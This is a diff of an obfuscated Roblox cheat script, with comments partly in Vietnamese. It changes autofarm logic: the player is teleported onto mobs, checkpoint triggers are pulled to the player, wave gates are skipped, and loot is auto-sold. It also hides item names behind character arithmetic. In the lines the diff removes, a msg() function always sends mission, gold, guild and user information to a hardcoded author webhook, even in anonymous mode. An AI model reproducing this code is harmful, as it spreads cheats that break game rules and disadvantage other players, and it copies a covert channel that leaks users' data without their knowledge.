+                    dZ:SetText('Gold Rate: ' .. math.floor((aR - e1) / (tick() - e0) * 600) / 10 .. '/min')
+                end
+                if d_ then
+                    d_ = false;
+                    e2 = true;
+                    e0 = tick()
+                    e1 = aR
+                end
+                dY:SetText('Gold Gained: ' .. formatNumberWithCommas(aR - aQ))
+                e3:SetText('Total Gold: ' .. formatNumberWithCommas(aR))
+                e7:SetText('CS Gold Gain: ' .. formatNumberWithCommas(aR - e8))
+            end
+            task.wait()
+        end
+    end)
+    task.spawn(function()
+        while true do
+            task.wait(1)
+            e4:SetText('Session Time: ' .. timeElapsed(tick() - sessionTick))
+            e6:SetText('Cross-Session Time: ' .. timeElapsed(tick() - e5))
+        end
+    end)
+end
+do
+    for B = 1, c6 do
+        for dM, ea in pairs(c7) do
+            if ea.OrderId == B then
+                cR:AddButton({
+                    Text = ea.Name,
+                    Func = function()
+                        S.Teleport.TeleportToHub:FireServer(ea.Id)
+                    end,
+                    DoubleClick = false
+                })
+            end
+        end
+    end
+end
+do
+    for B, C in pairs(am) do
+        local eb = bH[C]
+        cS:AddButton({
+            Text = eb.NameTag .. ' T' .. B,
+            Func = function()
+                StartRaid(C)
+            end,
+            DoubleClick = false
+        })
+    end
+end
+do
+    local ec;
+    for B, C in pairs(an) do
+        local eb = bH[C]
+        local ed = string.gsub(eb.NameTag, '%(NIGHTMARE%) ', '')
+        cT:AddButton({
+            Text = ed .. ' ' .. eb.DisplayWorldID .. '-' .. eb.WorldMissionID,
+            Func = function()
+                StartRaid(C, ec)
+            end,
+            DoubleClick = false
+        })
+    end
+    cT:AddToggle('ChallengeMode', {
+        Text = 'Challenge Mode',
+        Default = true
+    })
+    Toggles.ChallengeMode:OnChanged(function(cV)
+        if cV then
+            ec = 5
+        else
+            ec = 1
+        end
+    end)
+end
+local ee = Vector3.new(2000, 2000, 2000)
+local ef = Vector3.new()
+local eg;
+local eh;
+do
     function MobTeleport()
         task.spawn(function()
-            local dY;
-            local dZ;
-            local d_;
-            while Toggles.Autofarm.Value do
-                for K, L in bd:GetChildren() do
-                    if isAlive(L) then
-                        if mobWaitTbl and table.find(mobWaitTbl, L.Name) and (not d_ or alwaysWait) then
+            local ei;
+            local ej;
+            local ek;
+            while Toggles.Autofarm.Value and not b7 do
+                for B, C in pairs(b9:GetChildren()) do
+                    if isAlive(C) then
+                        if mobWaitTbl and table.find(mobWaitTbl, C.Name) and (not ek or alwaysWait) then
                             task.wait(waittime)
-                            d_ = true
+                            ek = true
                         end
-                        local a5 = L.PrimaryPart;
-                        if not firstMobFound then
-                            firstMobFound = true
+                        local X = C.PrimaryPart;
+                        if not ej then
+                            ej = true
                         end
-                        while isAlive(L) and Toggles.Autofarm.Value and a2 do
-                            bQ = L;
-                            dY = a5.Position;
-                            setCamera(not bP and Toggles.mobCamera.Value and bo, a5.Position)
-                            dV = isKrakenArm(L.Name) and 0 or (a5.Size.Y / 2 + Options.Offset.Value) *
-                                     (isRangedClass() and 1 or -1)
-                            dW = CFrame.new(a5.Position +
-                                                (table.find(aM, L) and dU or Vector3.new(0, dV, 0) + (bP and dT or dU))) +
-                                     a5.CFrame.lookVector * 2;
-                            dZ = dW;
-                            SmartPlayerTp(dW, a5)
-                            bS:Wait()
+                        while isAlive(C) and Toggles.Autofarm.Value and U and not b7 do
+                            bV = C;
+                            ei = X.Position;
+                            if bT then
+                                resetCamera()
+                            else
+                                setMobCamera(Toggles.mobCamera.Value, X)
+                            end
+                            eg = (X.Size.Y / 2 + Options.Offset.Value) * (cv() and 1 or -1)
+                            eh = CFrame.new(X.Position +
+                                                (table.find(aE, C) and ef or Vector3.new(0, eg, 0) + (bT and ee or ef))) +
+                                     X.CFrame.lookVector * 2;
+                            SmartPlayerTp(eh, X)
+                            bX:Wait()
                         end
                     end
                 end
-                bQ = nil;
-                setCamera()
+                bV = nil;
+                resetCamera()
                 unnoclip()
-                if aC and a2 and dZ then
-                    SmartPlayerTp(dZ)
+                if au and U and ej then
+                    SmartPlayerTp(CFrame.new(10000, 10000, 10000))
                 end
                 task.wait()
             end
-            if dY and aC then
-                SmartPlayerTp(CFrame.new(dY + Vector3.new(0, 10, 0)))
+            if ei and au then
+                SmartPlayerTp(CFrame.new(ei + Vector3.new(0, 10, 0)))
             end
         end)
     end
-    function MobTeleportIgnore(e0, mobWaitTbl, waittime, alwaysWait)
-        local d_;
+    function MobTeleportIgnore(el, mobWaitTbl, waittime, alwaysWait)
+        local ek;
         task.spawn(function()
             while Toggles.Autofarm.Value do
-                for K, L in bd:GetChildren() do
-                    if isAlive(L) then
-                        if L.Name ~= e0 or L.Name == e0 and b7 == 1 then
-                            if mobWaitTbl and table.find(mobWaitTbl, L.Name) and (not d_ or alwaysWait) then
+                for B, C in pairs(b9:GetChildren()) do
+                    if isAlive(C) then
+                        if C.Name ~= el or C.Name == el and b3 == 1 then
+                            if mobWaitTbl and table.find(mobWaitTbl, C.Name) and (not ek or alwaysWait) then
                                 task.wait(waittime)
-                                d_ = true
+                                ek = true
                             end
-                            local a5 = L.PrimaryPart;
-                            while isAlive(L) and Toggles.Autofarm.Value and a2 and
-                                (L.Name ~= e0 or L.Name == e0 and b7 == 1) do
-                                bQ = L;
-                                setCamera(not bP and Toggles.mobCamera.Value and bo, a5.Position)
-                                dV = isKrakenArm(L.Name) and 0 or (a5.Size.Y / 2 + Options.Offset.Value) *
-                                         (isRangedClass() and 1 or -1)
-                                dW = CFrame.new(a5.Position +
-                                                    (table.find(aM, L) and dU or Vector3.new(0, dV, 0) +
-                                                        (bP and dT or dU))) + a5.CFrame.lookVector * 2;
-                                SmartPlayerTp(dW, a5)
-                                bS:Wait()
+                            local X = C.PrimaryPart;
+                            while isAlive(C) and Toggles.Autofarm.Value and U and
+                                (C.Name ~= el or C.Name == el and b3 == 1) do
+                                bV = C;
+                                if bT then
+                                    resetCamera()
+                                else
+                                    setMobCamera(Toggles.mobCamera.Value, X)
+                                end
+                                eg = (X.Size.Y / 2 + Options.Offset.Value) * (cv() and 1 or -1)
+                                eh = CFrame.new(X.Position +
+                                                    (table.find(aE, C) and ef or Vector3.new(0, eg, 0) +
+                                                        (bT and ee or ef))) + X.CFrame.lookVector * 2;
+                                SmartPlayerTp(eh, X)
+                                bX:Wait()
                             end
                         end
                     end
                 end
-                bQ = nil;
-                setCamera()
+                bV = nil;
+                resetCamera()
                 unnoclip()
                 task.wait()
             end
         end)
     end
-    function MobTeleportPriority(e1, mobWaitTbl, waittime, alwaysWait)
-        local e2, e3;
+    function MobTeleportPriority(em, mobWaitTbl, waittime, alwaysWait, clearMobsFirst)
+        local en, eo;
         task.spawn(function()
             while Toggles.Autofarm.Value do
-                local e4 = false;
-                local e5 = {}
-                for K, L in bd:GetChildren() do
-                    if isAlive(L) then
-                        table.insert(e5, L)
+                local ep = false;
+                local eq = {}
+                local bossMobs = {}
+                local normalMobs = {}
+                
+                -- Phân loại mob và boss
+                for B, C in pairs(b9:GetChildren()) do
+                    if isAlive(C) then
+                        -- Phân loại boss và mob thường
+                        if string.match(C.Name, "BOSS") or string.match(C.Name, "Dragon") then
+                            table.insert(bossMobs, C)
+                        else
+                            table.insert(normalMobs, C)
+                        end
+                        table.insert(eq, C)
                     end
                 end
-                for K = 1, #e1 do
-                    for db, Mob in e5 do
-                        if Mob.Name == e1[K] then
-                            e4 = true;
-                            e2, e3 = Mob, Mob.Name;
+                
+                -- Nếu cờ clearMobsFirst được bật và có mob thường, ưu tiên mob thường
+                if clearMobsFirst and #normalMobs > 0 then
+                    en, eo = normalMobs[1], normalMobs[1].Name
+                    ep = true
+                else
+                    -- Logic ưu tiên ban đầu
+                    for B = 1, #em do
+                        for ds, Mob in pairs(eq) do
+                            if Mob.Name == em[B] then
+                                ep = true;
+                                en, eo = Mob, Mob.Name;
+                                break
+                            end
+                        end
+                        if ep then
                             break
                         end
                     end
-                    if e4 then
-                        break
+                    
+                    if not ep and eq[1] then
+                        en, eo = eq[1], eq[1].Name
                     end
                 end
-                if not e4 and e5[1] then
-                    e2, e3 = e5[1], e5[1].Name
-                end
+                
                 task.wait()
             end
         end)
+        
         task.spawn(function()
-            local d_;
+            local ek;
             while Toggles.Autofarm.Value do
-                if isAlive(e2) and a2 then
-                    local e6 = e2.PrimaryPart;
-                    bQ = e2;
-                    if mobWaitTbl and table.find(mobWaitTbl, e3) and (not d_ or alwaysWait) then
+                if isAlive(en) and U then
+                    local er = en.PrimaryPart;
+                    bV = en;
+                    if mobWaitTbl and table.find(mobWaitTbl, eo) and (not ek or alwaysWait) then
                         task.wait(waittime)
-                        d_ = true
+                        ek = true
                     end
-                    setCamera(not bP and Toggles.mobCamera.Value and bo, e6.Position)
-                    dV = isKrakenArm(e3) and 0 or (e6.Size.Y / 2 + Options.Offset.Value) * (isRangedClass() and 1 or -1)
-                    dW = CFrame.new(e6.Position +
-                                        (table.find(aM, e2) and dU or Vector3.new(0, dV, 0) + (bP and dT or dU))) +
-                             e6.CFrame.lookVector * 2;
-                    SmartPlayerTp(dW, e6)
+                    if bT then
+                        resetCamera()
+                    else
+                        setMobCamera(Toggles.mobCamera.Value, er)
+                    end
+                    eg = (er.Size.Y / 2 + Options.Offset.Value) * (cv() and 1 or -1)
+                    eh = CFrame.new(er.Position +
+                                        (table.find(aE, en) and ef or Vector3.new(0, eg, 0) + (bT and ee or ef))) +
+                             er.CFrame.lookVector * 2;
+                    SmartPlayerTp(eh, er)
                 else
-                    bQ = nil;
-                    setCamera()
+                    bV = nil;
+                    resetCamera()
                     unnoclip()
                 end
-                bS:Wait()
+                bX:Wait()
             end
         end)
     end
-    function AutoCheckpoint()
-        task.spawn(function()
-            while Toggles.Autofarm.Value do
-                if alive() then
-                    for db, e7 in workspace:GetChildren() do
-                        if not table.find(c0, e7.Name) then
-                            for K, L in e7:GetDescendants() do
-                                if L and L.Name == "TouchInterest" and L.Parent and
-                                    (table.find(b_, L.Parent.Name) or L.Parent.Parent and
-                                        table.find(b_, L.Parent.Parent.Name)) then
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer or Players:GetPlayers()[1] 
+local movedToTimer = false -- chỉ chạy 1 lần duy nhất
+
+function AutoCheckpoint()
+    task.spawn(function()
+        while Toggles.Autofarm.Value do
+            if alive() then
+                -- Kiểm tra nếu BossDoorTrigger đã được thêm
+                if not isBossDoorAdded then
+                    local character = LocalPlayer.Character
+                    if character then
+                        local hrp = character:FindFirstChild("HumanoidRootPart")
+                        if hrp then
+                            local missionObjects = workspace:FindFirstChild("MissionObjects")
+                            local missionStart = missionObjects and missionObjects:FindFirstChild("MissionStart")
+                            local missionTimer = missionStart and missionStart:FindFirstChild("MissionTimer")
+                            local surfaceGui = missionTimer and missionTimer:FindFirstChild("SurfaceGui")
+                            local collider = missionStart and missionStart:FindFirstChild("Collider")
+                            local timerLabel = surfaceGui and surfaceGui:FindFirstChild("Timer")
+
+                            local shouldSkip = false
+
+                            -- Chỉ kiểm tra Timer 1 lần
+                            if not movedToTimer and timerLabel and timerLabel:IsA("TextLabel") then
+                                if timerLabel.Text == "--" and collider and collider:IsA("BasePart") then
+                                    hrp.CFrame = collider.CFrame + Vector3.new(0, 5, 0)
+                                    movedToTimer = true
+                                    shouldSkip = true
+                                    warn("✅ Đã dịch chuyển đến Timer checkpoint")
+                                    task.wait(1)
+                                end
+                            end
+
+                            if not shouldSkip then
+                                -- Lấy Title.Text từ WaveStartGate
+                                local waveGate = missionObjects and missionObjects:FindFirstChild("WaveStartGate")
+                                local gateTimer = waveGate and waveGate:FindFirstChild("MissionTimer")
+                                local gateGui = gateTimer and gateTimer:FindFirstChild("SurfaceGui")
+                                local titleLabel = gateGui and gateGui:FindFirstChild("Title")
+                                local isWaiting = (titleLabel and titleLabel:IsA("TextLabel") and titleLabel.Text == "Waiting for players")
+
+                                -- Dịch chuyển đến WaveExitModel nếu vẫn còn trong trạng thái "Waiting for players"
+                                local waveExit = missionObjects and missionObjects:FindFirstChild("WaveExitModel")
+                                if isWaiting and waveExit then
+                                    local meshPart = waveExit:FindFirstChild("MeshPart")
+                                    if meshPart then
+                                        hrp.CFrame = meshPart.CFrame
+                                        task.wait(1.5)
+                                    end
+                                end
+
+                                -- Dịch chuyển đến WaveStartGate nếu có
+                                if waveGate then
+                                    local targetPart = waveGate:FindFirstChild("Collider")
+                                    if targetPart then
+                                        hrp.CFrame = targetPart.CFrame
+                                        task.wait(0.5)
+                                    end
+                                end
+                            end
+
+                            -- Xử lý TouchInterest nếu chưa thêm BossDoorTrigger
+                            for _, C in pairs(workspace:GetDescendants()) do
+                                if C and C.Name == "TouchInterest" and C.Parent and
+                                    (table.find(c3, C.Parent.Name) or (C.Parent.Parent and table.find(c3, C.Parent.Parent.Name))) then
                                     task.spawn(function()
-                                        L.Parent.CanCollide = false;
-                                        L.Parent.Anchored = true;
-                                        L.Parent.Transparency = 1;
-                                        L.Parent.CFrame = CFrame.new(aO.Position)
+                                        C.Parent.CanCollide = false
+                                        C.Parent.Anchored = true
+                                        C.Parent.Transparency = 1
+                                        C.Parent.CFrame = CFrame.new(hrp.Position)
                                         task.wait(0.25)
-                                        if L and L.Parent then
-                                            L.Parent.CFrame = CFrame.new(Vector3.new(0, 0, 0))
+                                        if C and C.Parent then
+                                            C.Parent.CFrame = CFrame.new(Vector3.new(0, 0, 0))
                                         end
                                     end)
                                 end
                             end
                         end
                     end
-                    local e8 = tick()
-                    while Toggles.Autofarm.Value do
-                        if tick() - e8 > 3 or tick() - e8 > 0.5 and b7 == 0 then
-                            break
-                        end
-                        task.wait()
-                    end
+                else
+                    -- Nếu BossDoorTrigger đã được thêm, chỉ đợi 1 giây và không làm gì cả
+                    task.wait(1)
                 end
-                task.wait()
-                if aG then
-                    break
-                end
+
+                task.wait(0.5)
+                if ay then break end
             end
-        end)
-    end
+
+            task.wait(0.5)
+        end
+    end)
+end
+
+
+
     function MobCounter()
         task.spawn(function()
             while Toggles.Autofarm.Value do
-                b8 = 0;
-                for K, L in bd:GetChildren() do
-                    if isAlive(L) then
-                        b8 = b8 + 1
+                b4 = 0;
+                for B, C in pairs(b9:GetChildren()) do
+                    if isAlive(C) then
+                        b4 = b4 + 1
                     end
                 end
-                if b7 ~= b8 then
-                    b7 = b8
+                if b3 ~= b4 then
+                    b3 = b4
                 end
                 task.wait()
             end
@@ -4418,52 +4569,52 @@ do
     function AntiFling()
         if Toggles.Autofarm.Value then
             task.spawn(function()
-                bO = nil;
-                while Toggles.Autofarm.Value do
-                    if bQ and bQ.PrimaryPart and bQ.PrimaryPart.Position then
-                        bO = aG and CFrame.new(Vector3.new(324, 60, -134)) or
-                                 CFrame.new(bQ.PrimaryPart.Position + Vector3.new(0, 5, 0))
+                bS = nil;
+                while Toggles.Autofarm.Value and not b7 do
+                    if bV and bV.PrimaryPart and bV.PrimaryPart.Position then
+                        bS = ay and CFrame.new(Vector3.new(324, 60, -134)) or
+                                 CFrame.new(bV.PrimaryPart.Position + Vector3.new(0, 5, 0))
                     end
-                    if bO and b7 == 0 then
-                        local e9 = tick()
-                        while tick() - e9 <= 0.1 and b7 == 0 do
-                            SmartPlayerTp(bO)
-                            bS:Wait()
+                    if bS and b3 == 0 then
+                        local es = tick()
+                        while tick() - es <= 0.1 and b3 == 0 do
+                            SmartPlayerTp(bS)
+                            bX:Wait()
                         end
-                        bO = nil
+                        bS = nil
                     end
                     task.wait()
                 end
-                if not Toggles.Autofarm.Value then
-                    if bO then
-                        local e9 = tick()
-                        while tick() - e9 <= 0.1 do
-                            SmartPlayerTp(bO)
-                            bS:Wait()
+                if not Toggles.Autofarm.Value and not b7 then
+                    if bS then
+                        local es = tick()
+                        while tick() - es <= 0.1 do
+                            SmartPlayerTp(bS)
+                            bX:Wait()
                         end
-                        bO = nil
+                        bS = nil
                     end
                 end
             end)
         end
     end
     function sell(bx)
-        _.Drops.SellItems:InvokeServer(bx)
+        S.Drops.SellItems:InvokeServer(bx)
     end
     function recycle(bx)
-        _.Recycler.Recycle:FireServer(bx)
+        S.Recycler.Recycle:FireServer(bx)
     end
 end
-if j then
-    function ChangeCosmetic(x, y)
-        if aN then
-            aQ:SetAttribute(x, y)
+if notadding then
+    local function et(o, p)
+        if aF then
+            aI:SetAttribute(o, p)
         end
     end
-    function color(c9, dh, di)
-        Color3.fromRGB(c9, dh, di)
+    local function d8(dy, dz, dA)
+        Color3.fromRGB(dy, dz, dA)
     end
-    local ea = {
+    local eu = {
         Red = Color3.fromRGB(255, 0, 0),
         Black = Color3.fromRGB(0, 0, 0),
         White = Color3.fromRGB(255, 255, 255),
@@ -4474,7 +4625,7 @@ if j then
         Orange = Color3.fromRGB(255, 127.5, 0),
         LightPink = Color3.fromRGB(255, 127.5, 255)
     }
-    local aY = {
+    local aS = {
         Costume = "Costume",
         CostumeDye = "CostumeDye",
         RightAura = "RightAura",
@@ -4491,864 +4642,888 @@ if j then
         Hat3Dye = "Hat3Dye",
         Mount = "Mount"
     }
-    local eb = {
+    local ev = {
         Costume = "CogWorkArmor",
         Hat1 = "CogWorkTophat",
         Hat2 = "CogWorkGoggles"
     }
-    function CogWorkOutfit()
-        if aQ:GetAttribute('Primary') then
-            local ec = bJ[aQ:GetAttribute('Primary')].SubType;
-            if ec == 'Greataxe' then
-                ChangeCosmetic(aY.RightWepSkin, 'CogWorkAxe')
-            else
-                ChangeCosmetic(aY.RightWepSkin, 'CogWork' .. ec)
+    do
+        function CogWorkOutfit()
+            if aI:GetAttribute('Primary') then
+                local ew = bL[aI:GetAttribute('Primary')].SubType;
+                if ew == 'Greataxe' then
+                    et(aS.RightWepSkin, 'CogWorkAxe')
+                else
+                    et(aS.RightWepSkin, 'CogWork' .. ew)
+                end
             end
-        end
-        if aQ:GetAttribute('Offhand') then
-            local ec = bJ[aQ:GetAttribute('Offhand')].SubType;
-            if ec == 'Greataxe' then
-                ChangeCosmetic(aY.LeftWepSkin, 'CogWorkAxe')
-            else
-                ChangeCosmetic(aY.LeftWepSkin, 'CogWork' .. ec)
+            if aI:GetAttribute('Offhand') then
+                local ew = bL[aI:GetAttribute('Offhand')].SubType;
+                if ew == 'Greataxe' then
+                    et(aS.LeftWepSkin, 'CogWorkAxe')
+                else
+                    et(aS.LeftWepSkin, 'CogWork' .. ew)
+                end
             end
-        end
-        for K, L in eb do
-            ChangeCosmetic(K, L)
+            for B, C in pairs(ev) do
+                et(B, C)
+            end
         end
     end
-    OutfitList:AddButton({
-        Text = 'Cogwork',
-        Func = function()
-            if aN then
-                CogWorkOutfit()
-            end
-        end,
-        DoubleClick = false
-    })
-end
-local function ed(dC, c8, cc)
-    return string.char(dC + c8 - cc)
-end
-local ee = ''
-ee = ee .. ed(68, 1, 1)
-ee = ee .. ed(101, 2, 2)
-ee = ee .. ed(109, 3, 3)
-ee = ee .. ed(111, 4, 4)
-ee = ee .. ed(110, 5, 5)
-table.insert(bn, ee)
-local ef = ''
-ef = ef .. ed(76, 2, 2)
-ef = ef .. ed(105, 1, 1)
-ef = ef .. ed(102, 0, 0)
-ef = ef .. ed(101, -1, -1)
-ef = ef .. ed(83, 0, 0)
-ef = ef .. ed(116, 0, 0)
-ef = ef .. ed(101, 0, 0)
-ef = ef .. ed(97, 0, 0)
-ef = ef .. ed(108, 0, 0)
-function hookWithUserInfo(eg, eh, ei, color, p, ej)
-    request({
-        Url = eg,
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = e:JSONEncode({
-            ["content"] = ej or '',
-            ["embeds"] = {{
-                ["title"] = eh,
-                ["description"] = ei,
-                ["type"] = 'rich',
-                ["color"] = tonumber(color),
-                ["footer"] = {
-                    ["text"] = p .. ' UTC'
-                }
-            }}
+    do
+        OutfitList:AddButton({
+            Text = 'Cogwork',
+            Func = function()
+                if aF then
+                    CogWorkOutfit()
+                end
+            end,
+            DoubleClick = false
         })
-    })
-end
-function anonHook(eg, eh, ei, color, p, ej)
-    request({
-        Url = eg,
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = e:JSONEncode({
-            ["content"] = ej or '',
-            ["embeds"] = {{
-                ["title"] = eh,
-                ["description"] = ei,
-                ["type"] = 'rich',
-                ["color"] = tonumber(color),
-                ["footer"] = {
-                    ["text"] = p .. ' UTC'
-                }
-            }}
-        })
-    })
-end
-function msg(ek, color, p)
-    local el = Options.dungeonHook.Value;
-    local em = p > 600 and timeElapsed(p) or math.round(p / 0.1) / 10 .. 's'
-    local en = 'Code: ``' .. i .. '``\nMission: ``' .. h .. '``\nTime: ``' .. em .. '``\nClass: ' .. '``' ..
-                   cd[b3].DisplayName .. '``'
-    if aC then
-        local bs = bd:GetChildren()[1]
-        local eo = bs and Mob(bs.Name)
-        local aa, e3 = eo and eo.BossTag, eo and eo.NameTag;
-        if aa and e3 then
-            en = en .. '\nBoss: ``' .. e3 .. '``'
-        end
-    end
-    if ad then
-        if ai.LastDungeonCompletion then
-            en = en .. '\nTime Since Last Completion: ``' .. math.round((bU - ai.LastDungeonCompletion) / 0.1) / 10 ..
-                     's``'
-        end
-        if ai.Gold and a3 >= ai.Gold then
-            en = en .. '\nGold Gained: ``' .. formatNumberWithCommas(a3 - ai.Gold) .. '``'
-        end
-        ai.Gold = a3;
-        ai.LastDungeonCompletion = bU;
-        save()
-    end
-    en = en .. '\nGold: ``' .. formatNumberWithCommas(aV.Value) .. '``'
-    if aF then
-        local ep = {
-            KrakenRaid = {
-                coinCode = "KrakenCoin",
-                coinStr = "Kraken Coins",
-                lb = "KRAKEN_KILLS",
-                name = "Kraken"
-            },
-            VaneRaid = {
-                coinCode = "DragonCoin",
-                coinStr = "Dragon Coins",
-                lb = "VANE_KILLS",
-                name = "Vane"
-            },
-            HalloweenRaid = {
-                coinCode = "HalloweenCoin",
-                coinStr = "Halloween Coins",
-                lb = "FALLENKING_KILLS",
-                name = "Halloween"
-            },
-            ChristmasRaid = {
-                coinCode = "ChristmasCoin",
-                coinStr = "Christmas Coins",
-                lb = "SANTA_KILLS",
-                name = "Christmas"
-            }
-        }
-        local eq = aG and "KrakenRaid" or aI and "VaneRaid" or aJ and "HalloweenRaid" or aH and "ChristmasRaid"
-        local er = ep[eq].coinCode;
-        local es = ep[eq].coinStr;
-        local et = ep[eq].lb;
-        local eu = ep[eq].name;
-        local ev = game:GetService("ReplicatedStorage").Shared.LeaderboardHookup.GetScore:InvokeServer(et, 1)
-        en = en .. '\n' .. eu .. ' Raids Completed: ``' .. ev[1] .. '`` / ``' .. ev[2] .. '``'
-        if bE:FindFirstChild(er) and bE[er]:FindFirstChild('Count') then
-            en = en .. '\n' .. es .. ': ``' .. bE[er].Count.Value .. '``'
-        end
-    elseif aC or aD then
-        en = en .. '\nFloor: **' .. Z.ReplicateTowerFloor.Value .. '**'
-    end
-    function getGuildInfo()
-        local M = _.Guilds.GetCache:InvokeServer(bR)
-        local N;
-        for K, L in M.Members do
-            if tonumber(K) == d then
-                N = L.Points;
-                break
-            end
-        end
-        if N then
-            en = en .. '\nGuild Points: ``' .. N .. '`` / ``' .. bR .. '``'
-        end
-    end
-    local ew = true;
-    if bR and not Toggles.anonHook.Value and ew then
-        getGuildInfo()
-    end
-    if not Toggles.anonHook.Value then
-        en = en .. '\n' .. f
-    end
-    if el and #el > 30 then
-        if ac then
-            task.wait(1.5)
-        end
-        ac = true;
-        if Toggles.anonHook.Value then
-            anonHook(el, ek, en, color, utcDateAndTime())
-        else
-            hookWithUserInfo(el, ek, en, color, utcDateAndTime())
-        end
-        ac = false
-    end
-    if not olympus then
-        if bR and Toggles.anonHook.Value then
-            getGuildInfo()
-        end
-        if Toggles.anonHook.Value then
-            en = en .. '\n' .. f
-        end
-        if ac then
-            task.wait(1.5)
-        end
-        ac = true;
-        hookWithUserInfo(boink3, ek, en, color, utcDateAndTime())
-        ac = false
     end
 end
-function missionEndRestartOrNextEvent()
-    if Toggles.Autofarm.Value then
-        if Toggles.nightmareLoop.Value and aE then
-            local ex = nextInTbl(av, as)
-            if bG[ex].InternalID == 3 and Toggles.skipScarecrowNm.Value then
-                ex = nextInTbl(av, ex)
-                libNoti('Skipping Scarecrow Defense')
-            end
-            StartRaid(ex, at)
-        elseif Toggles.NextDungeon.Value and not aC then
-            local ey = nextInTbl(c5, as)
-            local ez = table.find(ak, ey)
-            local eA = aU.Level.Value >= missionLevelReq(ey) and (at == 5 or aB or aD)
-            local eB = eA and ey or as;
-            local eC = not eA and (at == 1 and 5 or at) or not ez and 1 or nil;
-            StartRaid(eB, eC)
-        elseif Toggles.RestartDungeon.Value then
-            game:GetService("ReplicatedStorage").Shared.Missions.LeaveChoice:FireServer(true)
-            game:GetService("ReplicatedStorage").Shared.Missions.NotifyReadyToLeave:FireServer()
-            StartRaid(as, at)
-        end
-    end
+local function ex(dV, db, cV)
+    return string.char(dV + db - cV)
 end
-function openEndChests()
-    if Toggles.Autofarm.Value then
-        for K = 1, 4 do
-            b5:InvokeServer()
-        end
-    end
-end
-if aw then
-    if ar:FindFirstChild(6) then
-        task.spawn(function()
-            local eD, eE, eF = Workspace:WaitForChild('Pillar1'), Workspace:WaitForChild('Pillar2'),
-                Workspace:WaitForChild('Pillar3')
-            eF:WaitForChild('HealthProperties')
-            eD.Name = 'Pillar'
-            eE.Name = 'Pillar'
-            eF.Name = 'Pillar'
-            eD.Parent = bd;
-            eE.Parent = bd;
-            eF.Parent = bd
-        end)
-    elseif aA or aG then
-        task.spawn(function()
-            while true do
-                local eG = bd:FindFirstChild('BOSSKrakenMain') or bd:FindFirstChild('EVENTBOSSKraken')
-                if eG then
-                    local eH = Instance.new('Folder')
-                    eH.Name = 'WaterFolder'
-                    eH.Parent = Workspace;
-                    eG.Parent = Workspace.WaterFolder;
-                    if aA then
-                        bb = true
+local ey = ''
+ey = ey .. ex(68, 1, 1)
+ey = ey .. ex(101, 2, 2)
+ey = ey .. ex(109, 3, 3)
+ey = ey .. ex(111, 4, 4)
+ey = ey .. ex(110, 5, 5)
+table.insert(bl, ey)
+local ez = ''
+ez = ez .. ex(76, 2, 2)
+ez = ez .. ex(105, 1, 1)
+ez = ez .. ex(102, 0, 0)
+ez = ez .. ex(101, -1, -1)
+ez = ez .. ex(83, 0, 0)
+ez = ez .. ex(116, 0, 0)
+ez = ez .. ex(101, 0, 0)
+ez = ez .. ex(97, 0, 0)
+ez = ez .. ex(108, 0, 0)
+do
+    if ao then
+        if aj:FindFirstChild(6) then
+            task.spawn(function()
+                local eA, eB, eC = Workspace:WaitForChild('Pillar1'), Workspace:WaitForChild('Pillar2'),
+                    Workspace:WaitForChild('Pillar3')
+                eC:WaitForChild('HealthProperties')
+                eA.Name = 'Pillar'
+                eB.Name = 'Pillar'
+                eC.Name = 'Pillar'
+                eA.Parent = b9;
+                eB.Parent = b9;
+                eC.Parent = b9
+            end)
+        elseif as or ay then
+            task.spawn(function()
+                while true do
+                    local eD = b9:FindFirstChild('BOSSKrakenMain') or b9:FindFirstChild('EVENTBOSSKraken')
+                    if eD then
+                        local eE = Instance.new('Folder')
+                        eE.Name = 'WaterFolder'
+                        eE.Parent = Workspace;
+                        eD.Parent = Workspace.WaterFolder;
+                        if as then
+                            b7 = true
+                        end
+                        break
                     end
-                    break
+                    task.wait()
                 end
-                task.wait()
-            end
-        end)
-    elseif ar:FindFirstChild(30) then
-        local eI = 0;
-        task.spawn(function()
-            while true do
-                for K, L in bd:GetChildren() do
-                    if (L.PrimaryPart.Position - Vector3.new(533, 302, -123)).magnitude < 100 then
-                        L:Destroy()
-                        eI = eI + 1
-                    end
-                end
-                if eI == 3 then
-                    break
-                end
-                task.wait()
-            end
-        end)
-    end
-    local eJ = bG[as]
-    h = eJ.NameTag .. (at == 1 and ' Normal' or at == 5 and ' Challenge' or '')
-    h = string.gsub(h, '%(NIGHTMARE%) ', 'Nightmare ')
-    i = eJ.EventDungeon and 'Event' or (aC or aD) and 'Special' or eJ.TowerID and 'Tower ' .. eJ.TowerID or
-            eJ.DisplayWorldID .. '-' .. eJ.WorldMissionID;
-    _.Missions.MissionFinished.OnClientEvent:Once(function(eK, eL, eM, eN)
-        bU = tick()
-        a3 = aV.Value;
-        aK = true;
-        task.spawn(function()
-            libNoti('Mission ' .. (eM and 'Failed!' or 'Completed!'))
-            msg('Mission ' .. (eM and 'Failed' or 'Completed'), v[eM and "Red" or "Green"], eK)
-        end)
-        bE.ChildAdded:Connect(function(cc)
-            local eO = bJ[cc.Name]
-            local eP = bT:GetItemTier(cc)
-            local eQ;
-            if eO.Type == 'Weapon' or eO.Type == 'Armor' then
-                if bg then
-                    bh = false;
-                    bi = tick()
-                end
-                cc:WaitForChild('Level')
-                if eP < 6 then
-                    if Options.AutoSellTbl.Value[eP] and Toggles.Autofarm.Value then
-                        libNoti('Sold a Lvl ' .. cc.Level.Value .. ' T' .. eP .. ' ' .. eO.DisplayKey)
-                        sell({cc})
-                        eQ = true
-                    end
-                end
-                if eP == 5 and not Options.AutoSellTbl.Value[5] then
-                    cc:WaitForChild('Perk1')
-                    cc:WaitForChild('Perk2')
-                    cc:WaitForChild('Perk3')
-                    cc.Perk1:WaitForChild('PerkValue')
-                    cc.Perk2:WaitForChild('PerkValue')
-                    cc.Perk3:WaitForChild('PerkValue')
-                    local eR;
-                    local eS;
-                    local eT;
-                    if not Toggles.anonHook.Value then
-                        eT = f .. '\nType: ``' .. eO.Type .. '``\nLevel: ``' .. cc.Level.Value .. '``\n## ``' ..
-                                 eO.DisplayKey .. '``'
-                    else
-                        eT =
-                            'Type: ``' .. eO.Type .. '``\nLevel: ``' .. cc.Level.Value .. '``\n## ``' .. eO.DisplayKey ..
-                                '``'
-                    end
-                    for db, eU in cc:GetChildren() do
-                        if Options[eU.Value] then
-                            local eV = math.round(eU.PerkValue.Value * 100)
